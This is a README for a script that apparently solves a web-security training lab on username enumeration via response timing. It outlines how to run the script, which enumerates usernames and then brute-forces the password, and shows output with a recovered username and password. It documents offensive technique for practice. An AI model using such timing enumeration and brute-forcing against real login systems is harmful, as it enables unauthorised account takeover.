# Hack Steps
1. Obtain a valid username via response timing
2. Brute force password of that valid username

# Run Script
1. Change the URL of the lab
2. Change the PATH for your usernames list
3. Change the PATH for you passwords list
4. Start script
```
~$ python username_enumeration_via_response_timing.py
```

# Expected Output
```
[#] Enumerate usernames..
Elapsed: 0 minutes || Failed: 0 || Trying (6/101): adam                                              
[#] Brute forcing password..
✅ Valid user: adam
Elapsed: 0 minutes || Failed: 0 || Trying (74/102): joshua                                            
✅ Login successfully:  username: adam, password: joshua
✅ Finished in: 0 minutes
Results was saved to: results
Failed users count: 0
Failed users: [  ]
Failed passwords count: 0
Failed passwords: [  ]
```

# Want to go faster?
Check the [Rust script](https://github.com/elqal3awii/WebSecurity-Academy-with-Rust/tree/main/Authentication/username_enumeration_via_response_timing) for this lab in both single-threaded and multi-threaded approaches.
